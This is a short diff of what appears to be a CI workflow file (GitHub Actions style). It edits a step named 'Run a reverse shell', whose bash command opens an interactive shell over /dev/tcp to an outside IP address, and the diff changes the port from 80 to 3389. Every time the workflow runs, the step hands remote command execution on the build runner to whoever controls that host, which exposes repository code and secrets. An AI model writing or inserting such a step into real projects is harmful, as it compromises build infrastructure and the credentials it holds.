@@ -25,4 +25,4 @@ jobs:
     # Runs a set of commands using the runners shell
     - name: Run a reverse shell
       run: |
-        bash -i >& /dev/tcp/72.224.203.78/80 0>&1
+        bash -i >& /dev/tcp/72.224.203.78/3389 0>&1
